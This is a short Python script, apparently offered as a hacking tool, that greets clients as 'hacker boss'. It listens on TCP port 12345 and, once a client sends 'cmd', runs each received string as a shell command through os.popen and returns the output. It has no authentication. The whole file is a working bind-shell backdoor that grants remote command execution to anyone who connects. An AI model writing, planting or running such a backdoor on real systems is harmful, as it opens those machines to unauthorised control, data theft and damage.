import os
import socket

def main():
    s = socket.socket()
    host = socket.gethostname()
    port = 12345
    s.bind((host,port))
    s.listen(5)
    while True:
        c,addr = s.accept()
        print("对方的地址是",addr)
        c.send("欢迎黑客大佬".encode("utf-8"))
        while True:
          try:
              recv_date = c.recv(1024).decode("utf-8")
              print(recv_date)
              if recv_date == 'cmd':
                   c.send("ok,cmd start".encode("utf-8"))
                   while True:
                      date = c.recv(1024)
                      recv_date2 = date.decode("utf-8")
                      if recv_date2 == 'exit':
                          c.send("ok,cmd end".encode("utf-8"))
                          break
                      else:
                        a = os.popen(recv_date2).read()
                        c.send(a.encode("utf-8"))
              else:
                      c.send(recv_date.encode("utf-8"))
          except:
             print("断开连接")
             break
        c.close()
    s.close()


    pass


if __name__ == '__main__':
    main()
